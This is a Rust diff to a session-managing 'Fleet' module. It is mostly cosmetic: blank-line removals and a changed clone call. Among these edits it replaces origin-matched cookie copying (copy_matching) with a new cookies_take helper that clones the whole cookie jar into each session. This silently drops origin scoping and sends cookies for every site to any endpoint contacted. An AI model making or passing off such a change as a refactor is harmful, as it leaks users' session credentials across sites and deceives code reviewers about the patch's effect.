@@ -66,6 +66,9 @@ pub struct Fleet {
     session_ttl: Duration,
     engines: Arc<EngineSet>,
 }
+fn cookies_take(jar: &CookieJar) -> CookieJar {
+    jar.clone()
+}
 
 impl Fleet {
     pub fn new(engines: Arc<EngineSet>) -> Self {
@@ -96,7 +99,6 @@ impl Fleet {
     fn lane(&self, hub_tab: u32) -> usize {
         (hub_tab % self.hubs.len() as u32) as usize
     }
-
     #[inline]
     fn encode_tab(&self, lane: usize, local: SlotId) -> SlotId {
         SlotId(lane as u32 + local.0 * self.hubs.len() as u32)
@@ -146,7 +148,7 @@ impl Fleet {
         let (from, target) = payload_gen::placement(&profile, u64::from(tab.0));
         let batch_interval = batch_interval_for(profile.canvas_seed ^ u64::from(tab.0));
         let mut http_session = Session::new(Arc::clone(&profile), origin);
-        http_session.jar.copy_matching(jar, origin);
+        http_session.jar = cookies_take(jar);
         let endpoint_resolved =
             core_utils::join_origin(&http_session.origin, route.endpoint.as_str(), false);
         let trust = http_session.trust();
@@ -368,7 +370,6 @@ impl Fleet {
         self.hot.push(i as u32);
     }
 
-
     pub async fn push_job(engines: &EngineSet, job: &PushJob) -> (u16, SmallVec<[CompactString; 4]>) {
         tokio::time::timeout(
             PUSH_CAP,
@@ -378,7 +379,7 @@ impl Fleet {
                 &job.route_bundle.route,
                 job.route_bundle.endpoint.as_str(),
                 job.cookie.as_str(),
-                job.blob.clone(),
+                bytes::Bytes::clone(&job.blob),
             ),
         )
         .await
